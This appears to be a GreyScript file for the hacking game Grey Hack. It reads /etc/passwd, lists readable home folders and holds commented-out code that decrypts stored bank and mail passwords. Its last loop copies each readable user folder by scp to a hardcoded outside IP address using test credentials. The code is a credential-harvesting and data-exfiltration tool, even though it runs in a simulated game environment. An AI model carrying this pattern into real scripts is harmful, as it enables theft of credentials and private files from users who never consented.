shell=get_shell
computer=shell.host_computer
root_folder=computer.File("/")
crypto=include_lib("/lib/crypto.so")
if typeof(crypto)!="cryptoLib" then crypto=include_lib(current_path+"/crypto.so")
passwd_file=null
user_access=[]
if not root_folder then exit "Path to '/' Not Found"
if not computer.File("/etc/passwd") then
    print("Password File Not Found")
else
    if computer.File("/etc/passwd").has_permission("r") then passwd_file=computer.File("/etc/passwd").get_content
end if
users=computer.File("/home")
if not users then
    print "/Home folder not found!"
else
    if users.has_permission("r") then
        for user in users.get_folders
            if user.has_permission("r") then 
                user_access.push(user)
            end if
        end for
    end if
end if
//for user in user_access
//    //get_bank_infomation
//    if computer.File(user.path+"/Config").has_permission("r") then
//        bank_file=computer.File(user.path+"/Config/Bank.txt").get_content
//        bank_password=crypto.decipher(bank_file.split(":")[1])
//        if bank_password then print bank_password.get_content.split(":")[1]+":"+bank_password
//    end if
//    //get_mail_infomation
//    if computer.File(user.path+"/Config").has_permission("r") then
//        mail_file=computer.File(user.path+"/Config/Mail.txt").get_content
//        mail_password=crypto.decipher(mail_file.split(":")[1])
//        if mail_password then print mail_password.get_content.split(":")[1]+":"+mail_password
//    end if
//end for
for user in user_access
    shell.scp(user.path,"/home/test/remoteusers",shell.connect_service("67.109.194.193",23,"test","test"))
end for